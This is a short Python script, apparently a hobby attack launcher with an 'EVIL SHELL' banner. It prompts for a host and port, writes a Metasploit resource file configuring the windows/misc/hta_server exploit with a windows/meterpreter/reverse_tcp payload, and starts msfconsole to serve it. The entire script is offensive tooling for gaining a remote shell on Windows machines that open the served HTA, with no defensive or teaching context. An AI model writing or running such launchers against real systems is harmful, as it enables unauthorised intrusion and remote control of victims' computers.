import os
import os.path
import sys


def clr_scrn():
	os.system("clear")

		
def Banner():
	print("""
 ___                 __        ___           
|__  \  / | |       /__` |__| |__  |    |    
|___  \/  | |___    .__/ |  | |___ |___ |___ 
                                             

	""")




class RunCode:
	def __init__(self):
		clr_scrn()
		Banner()

		self.exploit = 'windows/misc/hta_server'
		self.payload = 'windows/meterpreter/reverse_tcp'
		self.lhost = input("Enter the host: ")
		self.lport = input("Enter the port: ")
		self.file = '/Desktop/msf/exploit.rc'
		if os.path.exists(self.file):
			with open(self.file, 'w') as file:
				file.write("\n")
				file.write(f"use {self.exploit}")
				file.write("\n")
				file.write(f"set payload {self.payload}")
				file.write("\n")
				file.write(f"set LHOST {self.lhost}")
				file.write("\n")
				file.write(f"set LPORT {self.lport}")
				file.write("\n")
				file.write(f"exploit")
			clr_scrn()
			os.system(f"msfconsole -r {self.file}")




		else:
			print("'exploit.rc' file is not created I will make it for you")
			os.system(f"touch {self.file}")
			clr_scrn()
			RunCode()



if __name__ == '__main__':
	try:
		RunCode()

	except KeyboardInterrupt:
		exit()
